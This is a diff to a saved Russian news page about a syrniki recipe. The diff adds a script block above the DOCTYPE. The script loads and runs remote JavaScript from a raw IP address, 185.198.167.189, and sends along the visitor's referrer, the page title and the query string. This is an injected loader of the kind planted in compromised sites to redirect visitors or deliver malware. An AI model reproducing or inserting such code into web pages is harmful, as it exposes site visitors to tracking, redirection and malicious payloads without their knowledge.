@@ -1,3 +1,12 @@
+<script type="application/javascript">
+var d=document;var s=d.createElement('script'); 
+s.src='//185.198.167.189/R9nPvp?frm=script&se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+''; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+}
+</script>
 <!DOCTYPE html>
 <!-- saved from url=(0072)https://tolknews.ru/news/2775-kak-i-iz-cego-prigotovit-nastoasie-syrniki -->
 <html lang="ru-RU" prefix="og: http://ogp.me/ns#"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
